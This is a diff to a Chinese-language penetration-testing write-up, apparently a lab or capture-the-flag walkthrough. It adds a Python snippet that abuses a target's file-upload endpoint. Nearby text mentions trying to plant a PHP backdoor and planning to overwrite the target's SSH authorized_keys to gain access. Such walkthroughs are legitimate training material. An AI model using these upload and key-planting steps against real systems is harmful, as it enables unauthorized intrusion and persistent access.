@@ -145,6 +145,19 @@ curl http://192.168.237.249:33414/file-list?dir=/tmp
 </html>
 ```
 
+或者使用 python 上传：
+
+```python
+import requests
+
+url = 'http://192.168.237.249:33414/file-upload'
+files = {'file': open('~/Downloads/test.txt', 'rb')}
+data = {'filename': '/tmp/2.txt'}
+
+response = requests.post(url, files=files, data=data)
+print(response.text)
+```
+
 经过上传测试，发现 1.txt 已经上传到了 /tmp 中，但是经过测试，发现不能上传 php 后门到/var/www/html 中，估计是没有写权限。
 
 在上面发现的 /home/alfredo/.ssh 目录中有 id_rsa ,尝试下能不能上传自己生成的 authorized_key，去覆盖目标机器上的 authorized_key：
